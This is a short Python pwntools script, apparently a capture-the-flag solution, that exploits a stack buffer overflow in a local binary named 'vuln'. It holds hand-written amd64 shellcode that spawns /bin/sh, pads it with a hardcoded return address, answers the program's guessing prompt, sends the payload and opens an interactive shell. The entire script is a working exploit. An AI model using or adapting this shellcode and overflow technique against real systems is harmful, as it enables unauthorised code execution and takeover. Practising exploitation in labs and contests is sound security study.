from pwn import *

"""
shellcode = asm('''
   .intel_syntax noprefix
   .globl _start
_start:
   push 0x6e69622f
   add rsp, 0xc
   push 0x68732f2f
   sub rsp, 0x4
   mov rdi, rsp
   xor rdx, rdx
   push rdx
   push rdi
   mov rsi, rsp
   xor rax, rax
   mov al, 0x3b
   syscall
''', arch = 'amd64')
"""

shellcode = b'AAAAAAAAAAAAAA' + b'h/binH\x83\xc4\x0ch//shH\x83\xec\x04H\x89\xe7H1\xd2RWH\x89\xe6H1\xc0\xb0;\x0f\x05'
print(enhex(shellcode))
payload = shellcode + b"A"*(114 - len(shellcode)) + p64(0x7fffffffd9d0)
print(payload)
print(enhex(payload))

r = process("./vuln")
print(r.recvuntil(b"What number would you like to guess?"))
r.sendline(b"84")
print(r.recvuntil(b"Name?"))
r.sendline(payload)
print(r.recvline())
r.interactive()

